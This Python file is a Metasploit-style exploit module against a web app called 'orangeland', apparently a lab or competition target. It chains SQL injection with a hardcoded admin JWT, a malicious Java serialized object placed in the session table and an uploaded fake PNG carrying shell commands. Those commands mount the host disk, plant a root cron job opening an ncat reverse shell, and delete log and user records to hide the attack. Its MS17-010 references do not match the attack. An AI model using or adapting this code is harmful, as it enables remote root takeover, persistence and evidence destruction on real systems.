#!/usr/bin/env python3

from metasploit import module
import requests, warnings, argparse, random, string, socket, subprocess
metadata = {
    'name': 'Orangeland',
    'description': '''
	Web exploit to gain remote execution on orangeland network.
    ''',
    'authors': [
	'something',
        'RAG'
    ],

    'references': [
        {'type': 'msb', 'ref': 'MS17-010'},
        {'type': 'cve', 'ref': '2017-0143'},
        {'type': 'cve', 'ref': '2017-0144'},
        {'type': 'cve', 'ref': '2017-0145'},
        {'type': 'cve', 'ref': '2017-0146'},
        {'type': 'cve', 'ref': '2017-0147'},
        {'type': 'cve', 'ref': '2017-0148'},
        {'type': 'edb', 'ref': '42030'},
        {'type': 'url', 'ref': 'https://github.com/worawit/MS17-010'}
    ],
    'date': 'Jun 3 2024',
    'type': 'remote_exploit',
    'rank': 'average',
    'privileged': True,
    'wfsdelay': 5,
    'targets': [
        {'platform': 'linux', 'arch': 'x86_64', 'name': 'Ubuntu 22.04'}
    ],

'options': {
	'RHOST': {'type': 'address', 'description': 'Base path', 'required': True, 'default': None},
        'RPORT': {'type': 'int', 'description': 'The port for the victim', 'required': True, 'default': None},
	'LHOST': {'type': 'address', 'description': 'Listener host ip', 'required': True, 'default': None},
        'LPORT': {'type': 'int', 'description': 'The port for the listener of the reverse shell', 'required': True, 'default': None}
    },
    'notes': {
        'AKA': ['Jeremys Xs']
    }
}


# Suppress all warnings
warnings.filterwarnings("ignore")

def random_string():
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(random.randint(5, 10)))

def format_url(ip, endpoint, port):
    return f"https://{ip}:{port}{endpoint}"

def sql_inject(ip, port, sql, my_ip, my_port, username, session_id):
    url = format_url(ip, "/admin/content",port)
    data = {
        'title': "team_alpha_time', 'announcements', 'a', 'a', 'a');DELETE FROM content WHERE title is 'team_alpha_time';"+ sql + '--',
        'category': ' ',
        'description': ' ',
        'body': ' '
    }
    cookies = {
        'jwt': 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJBRE1JTiIsImlhdCI6MTcxOTg0ODA3NiwiZXhwIjoxNzE5ODg0MDc2fQ.zWOJey0mT6dD-GI91Pv2vbA-EV2KyVyCCYmv4jgrxuw'
    }
    user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/420.69'
    headers = {
        'User-Agent': user_agent
    }
    commands  = b"mkdir /host\n"
    commands += b"mount $(mount | grep -o '^[^ ]*' | grep /dev | head -n 1) /host\n"
    commands += b"echo \"* *     * * *   root  /bin/bash -c 'head -n -1 /etc/crontab > temp && mv temp /etc/crontab; ncat " + my_ip.encode('ascii') + b" " + str(my_port).encode('ascii') + b" -e /bin/bash'\" >> /host/etc/crontab\n"
    commands += b"umount /host\n"
    commands += b"rmdir /host\n"
    commands += b"sqlite3 database.db \"DELETE FROM JettySessions WHERE sessionId = '" + session_id.encode('ascii') + b"';\"\n"
    commands += b"sqlite3 database.db \"DELETE FROM users WHERE username = '" + username.encode('ascii') + b"';\"\n"
    commands += b"sqlite3 database.db \"DELETE FROM request_logs WHERE user_agent = '" + user_agent.encode('ascii') + b"';\"\n"
    commands += b"rm -f ./public/images/*tism*\n"
    files = {
        'image': ("tism_touch.png", commands, 'image/png')
    }
    response = requests.post(url, data=data, cookies=cookies, headers=headers, files=files, verify=False)
    return response

def register(ip, port, session, user, password):
    url = format_url(ip, "/register", port)
    fname = ''.join(random.choice(string.ascii_lowercase) for _ in range(random.randint(5, 10)))
    data = {
        'username': user,
        'password': password,
        'firstName': fname,
        'lastName': ''.join(random.choice(string.ascii_lowercase) for _ in range(random.randint(5, 10))),
        'email': fname + "@gmail.com",
        'phone': ''.join(random.choice(string.digits) for _ in range(10))
    }
    user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/420.69'
    headers = {
        'User-Agent': user_agent,
    }
    response = session.post(url, data=data, headers=headers, verify=False)
    return response

def login(ip, port, session, user, password):
    url = format_url(ip, "/login", port)
    data = {
        'username': user,
        'password': password
    }
    user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/420.69'
    headers = {
        'User-Agent': user_agent,
    }
    response = session.post(url, data=data, headers=headers, verify=False)
    return response

def trigger(ip, port, session):
    url = format_url(ip, "/home", port)
    user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/420.69'
    headers = {
        'User-Agent': user_agent,
    }
    response = session.get(url, headers=headers, verify=False)
    return response

def exploit(args):
    while True:
        username = random_string()
        password = random_string()
        session = requests.Session()
        if(b"Registration Failed" in register(args['RHOST'], args['RPORT'], session, username, password).content):
            continue
        login(args['RHOST'], args['RPORT'], session, username, password)
        session_id = session.cookies.get_dict()["JSESSIONID"].split('.')[0]
        serialized_object = "ACED0005737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B0200007870000000037732002F6F72672E65636C697073652E6A657474792E73656375726974792E73657373696F6E4372656174656453656375726500737200116A6176612E6C616E672E426F6F6C65616ECD207280D59CFAEE0200015A000576616C7565787001770B0008746F756368206F66007372001C696F2E6F72616E636F2E7574696C732E5461736B4578656375746F7200000000000000010200014C00047461736B7400144C6A6176612F6C616E672F52756E6E61626C653B78707372001F696F2E6F72616E636F2E7574696C732E4C6F67526F746174696F6E5461736B00000000000000010200044A000B6D617846696C6553697A654C000B6C6F6746696C65506174687400124C6A6176612F6C616E672F537472696E673B4C000670726566697871007E00094C000673756666697871007E00097870FFFFFFFFFFFFFFFF74000362627774003D3B2063686D6F64202B78202E2F7075626C69632F696D616765732F2A7469736D2A202626202E2F7075626C69632F696D616765732F2A7469736D2A2023740000770B0008757365726E616D650074000475736572"
        sql = f"UPDATE JettySessions SET map = x'{serialized_object}' WHERE sessionId = '{session_id}';"
        sql_inject(args['RHOST'], args['RPORT'], sql, args['LHOST'], args['LPORT'], username, session_id)
        trigger(args['RHOST'], args['RPORT'], session)
        subprocess.run(['nc', '-lvnp', str(args['LPORT'])])
        return 0

if __name__ == "__main__":
    module.run(metadata, exploit)
